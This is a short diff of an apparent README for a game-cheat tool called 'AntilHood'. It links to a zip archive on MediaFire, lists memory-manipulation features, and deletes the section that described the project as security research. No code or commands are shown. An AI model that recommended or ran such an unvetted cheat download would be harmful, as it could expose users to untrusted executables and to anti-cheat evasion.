@@ -7,8 +7,8 @@
 🔗 [Download via MediaFire](https://www.mediafire.com/file/z8nljm3h8g9jez0/AntilHood.zip/file)
 
 
-## 🔍 Project Overview
-This repository contains research code analyzing game security mechanisms. It demonstrates various memory manipulation techniques that anti-cheat systems aim to prevent.
+
+
 
 ## 🛠️ Technical Features
 - Memory pattern scanning
